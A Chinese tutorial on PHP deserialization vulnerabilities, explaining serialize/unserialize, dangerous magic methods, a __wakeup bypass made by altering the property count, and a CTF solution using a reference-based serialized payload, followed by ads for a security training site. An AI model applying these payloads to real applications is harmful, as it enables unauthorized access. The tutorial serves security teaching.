@@ -1,0 +1,82 @@
+<p>很多小白可能都会有这样的疑惑，PHP 我知道，序列化我也知道，合在一起的 PHP 反序列化就搞不懂了。</p><p>今天就来破解 PHP 反序列化漏洞之谜。</p><h2>PHP序列化与反序列化</h2><p>首先，我们来理解，PHP 序列化与 PHP 反序列化这两个名词。</p><blockquote>序列化，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</blockquote><p><b>serialize()</b></p><blockquote>函数用于序列化对象或数组，并返回一个字符串。</blockquote><p>简单来说，序列化就是把一水果整齐的放在果盘里，比如：</p><div class="highlight"><pre><code class="language-text">&lt;?php
+$sites = array(&#39;a&#39;, &#39;bb&#39;, &#39;ccc&#39;);
+$serialized_data = serialize($sites);
+echo  $serialized_data;
+?&gt;</code></pre></div><p>输出结果为：</p><div class="highlight"><pre><code class="language-text">a:3:{i:0;s:1:&#34;a&#34;;i:1;s:2:&#34;bb&#34;;i:2;s:3:&#34;ccc&#34;;}</code></pre></div><blockquote>o表示对象，a表示数组，s表示字符，i表示数字</blockquote><p>意思就是往果盘里面放了一个苹果、两个香蕉、三个梨，总共 3 类。</p><p>放入对象也是类似的。</p><div class="highlight"><pre><code class="language-text">&lt;?php
+class name1 {
+    var $test1;
+    var $test2;
+}
+$test3 = new name1;
+$test3-&gt;test1 = &#39;hi&#39;;
+$test3-&gt;test2 = &#39;fun&#39;;
+echo serialize($test3); </code></pre></div><p>输出结果：</p><div class="highlight"><pre><code class="language-text">O:5:&#34;name1&#34;:2:{s:5:&#34;test1&#34;;s:2:&#34;hi&#34;;s:5:&#34;test2&#34;;s:3:&#34;fun&#34;;}</code></pre></div><p><b>unserialize()</b></p><p>单词前面加个“un”，大家都不陌生吧，就是跟前面相反的意思，把水果从果盘里面拿出来。</p><p>比如：</p><div class="highlight"><pre><code class="language-text">&lt;?php
+$sites = array(&#39;a&#39;, &#39;bb&#39;, &#39;ccc&#39;);
+$serialized_data = serialize($sites);
+$unserialized_data = unserialize($serialized_data);
+print_r($unserialized_data);
+?&gt;</code></pre></div><p>输出结果：</p><div class="highlight"><pre><code class="language-text">Array
+(
+    [0] =&gt;  a
+    [1] =&gt;  bb
+    [2] =&gt;  ccc
+)</code></pre></div><p>这就是 PHP 的反序列化，返回原始的结构。</p><h2>反序列化漏洞</h2><p>不就是放水果、拿水果吗？有什么危险的。</p><p>下面来介绍几种“果虫”，也就是危险的 PHP 魔法函数。</p><div class="highlight"><pre><code class="language-text">construct():当一个类被创建时自动调用
+destruct():当一个类被销毁时自动调用
+invoke():当把一个类当作函数使用时自动调用
+tostring():当把一个类当作字符串使用时自动调用
+wakeup():当调用unserialize()函数时自动调用
+sleep():当调用serialize()函数时自动调用
+__call():当要调用的方法不存在或权限不足时自动调用</code></pre></div><p>来看看是怎样祸害我们的水果的：</p><div class="highlight"><pre><code class="language-text">&lt;?php
+class chybeta{
+	var $test = &#39;123&#39;;
+	function __wakeup(){
+		echo &#34;__wakeup&#34;;
+		echo &#34;&lt;/br&gt;&#34;;
+	}
+	function __construct(){
+		echo &#34;__construct&#34;;
+		echo &#34;&lt;/br&gt;&#34;;
+	}
+	function __destruct(){
+		echo &#34;__destruct&#34;;
+		echo &#34;&lt;/br&gt;&#34;;
+	}
+}
+$class2 = &#39;O:7:&#34;chybeta&#34;:1:{s:4:&#34;test&#34;;s:3:&#34;123&#34;;}&#39;;
+	print_r($class2);
+echo &#34;&lt;/br&gt;&#34;;
+$class2_unser = unserialize($class2);
+print_r($class2_unser);
+echo &#34;&lt;/br&gt;&#34;;
+?&gt;</code></pre></div><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg" data-caption="" data-size="normal" data-rawwidth="471" data-rawheight="162" class="origin_image zh-lightbox-thumb" width="471" data-original="https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg" data-caption="" data-size="normal" data-rawwidth="471" data-rawheight="162" class="origin_image zh-lightbox-thumb lazy" width="471" data-original="https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-677af168602c47afe9c10c565c19f433_b.jpg"/></figure><p>unserialize() 反序列化之后，会导致 wakeup() 或 destruct() 的直接调用，因此最理想的情况就是一些漏洞/危害代码在 wakeup() 或 destruct() 中，从而当我们控制序列化字符串时可以去直接触发它们。</p><p><b>绕过魔法函数</b></p><p>魔法函数 sleep() 和 wakeup()</p><blockquote>php 文档中定义 __wakeup():<br/>unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep() 则相反，是用在序列化一个对象时被调用.</blockquote><p>正常情况下的反序列化漏洞如下图：</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg" data-caption="" data-size="small" data-rawwidth="1017" data-rawheight="731" class="origin_image zh-lightbox-thumb" width="1017" data-original="https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg" data-caption="" data-size="small" data-rawwidth="1017" data-rawheight="731" class="origin_image zh-lightbox-thumb lazy" width="1017" data-original="https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-90500077916805f7bacda063b5a937ae_b.jpg"/></figure><p>析构方法和 __wakeup 都能够执行</p><p>如果我们把传入的序列化字符串的属性个数更改成大于 1 的任何数</p><div class="highlight"><pre><code class="language-text">O:7:&#34;hpdoger&#34;:2:{s:1:&#34;a&#34;;s:6:&#34;u know&#34;;}</code></pre></div><p>得到的结果如图，__wakeup 没有被执行，但是执行了析构函数</p><h2>CTF题实战</h2><p><b>南邮CTF</b></p><div class="highlight"><pre><code class="language-text">&lt;?php
+class just4fun { //定义了一个类
+    var $enter;
+    var $secret;
+}
+if (isset($_GET[&#39;pass&#39;])) {
+    $pass = $_GET[&#39;pass&#39;];
+
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+
+    $o = unserialize($pass); //进行反序列化处理
+
+    if ($o) {
+        $o-&gt;secret = &#34;*&#34;; //这里不知道*代表的是啥
+        if ($o-&gt;secret === $o-&gt;enter) //要求$o中的两个属性值相同
+            echo &#34;Congratulation! Here is my secret: &#34;.$o-&gt;secret;
+        else 
+            echo &#34;Oh no... You can&#39;t fool me&#34;;
+    }
+    else echo &#34;are you trolling?&#34;;
+}
+?&gt;</code></pre></div><p>由于我们不知道 * 代表的是什么，所以用指针来直接让两个的属性相等。</p><div class="highlight"><pre><code class="language-text">&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+$o = new just4fun;
+$o-&gt;enter = &amp;$o-&gt;secret; //这里的a=&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于b
+echo serialize($o);
+?&gt;</code></pre></div><p>本地运行即可得到序列化字符串</p><div class="highlight"><pre><code class="language-text">O:8:&#34;just4fun&#34;:2:{s:5:&#34;enter&#34;;N;s:6:&#34;secret&#34;;R:2;}</code></pre></div><p>然后将此作为 pass 参数 GET 发送即可获得 flag。</p><p><a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg" data-caption="" data-size="normal" data-rawwidth="2560" data-rawheight="1192" class="origin_image zh-lightbox-thumb" width="2560" data-original="https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg" data-caption="" data-size="normal" data-rawwidth="2560" data-rawheight="1192" class="origin_image zh-lightbox-thumb lazy" width="2560" data-original="https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg"/></figure><a href="https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o" data-draft-node="block" data-draft-type="link-card" class=" wrap external" target="_blank" rel="nofollow noreferrer">新手入门 | 梦境穿越 - 主题技能包</a><p>更多有关渗透测试的内容请前往<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure>
